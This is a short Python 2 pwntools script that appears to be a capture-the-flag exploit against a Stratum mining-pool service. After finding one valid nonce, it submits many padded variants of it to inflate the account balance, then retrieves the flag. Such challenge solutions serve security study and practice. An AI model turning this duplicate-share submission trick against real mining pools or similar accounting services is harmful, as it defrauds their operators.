#!/usr/bin/env python2

from pwn import *
import sys

from stratum import Stratum, FINAL_DIFF

TIMEOUT = 90

def main():

    host = sys.argv[1]
    port = int(sys.argv[2])

    conn = remote(host, port)
    # context.log_level = 'DEBUG'

    s = Stratum(conn)
    s.login()

    balance = 0
    end = time.time() + TIMEOUT
    while time.time() < end:
        cur_job = None
        for i in xrange(1000):
            if s.try_solve():
                cur_job = s.job
                break
        if cur_job is None:
            # restart the loop after checking timeout
            continue
        soln = struct.pack('>I', s.nonce2).encode('hex')
        if not soln.startswith('000'):
            log.warn('not good solution %s', soln)
            continue
        soln = soln.lstrip('0') + 'z'
        for i in xrange(150):
            soln_ = ('%s%x' % (soln, i)).ljust(8)
            res = s.submit(soln_, cur_job['time'], cur_job['id'])
            if res.get('error'):
                log.info('submitted %d soluntions before error: %s', i, res.get('error'))
                break
        share = s.get_share()
        balance = s.get_balance()
        speed = s.get_speed()
        log.info('share = %d balance = %s speed = %s', share, balance, speed)
        if balance >= FINAL_DIFF:
            break
        s.set_target(['001' + '0' * 0x3d]) # diff 4096

    # we have enough balance or timeout
    if balance >= FINAL_DIFF:
        log.info('final balance = %s', balance)

        bits = int(s.query_flag(range(192))[::-1], 2)
        flag = hex(bits)[2:].strip('L').rjust(48, '0').decode('hex')[::-1].encode('hex')

        print "FLAG:", flag
    else:
        log.warn('exploit failed due to timeout(unlucky)')

    sys.exit(0)


if __name__ == '__main__':
    main()
    

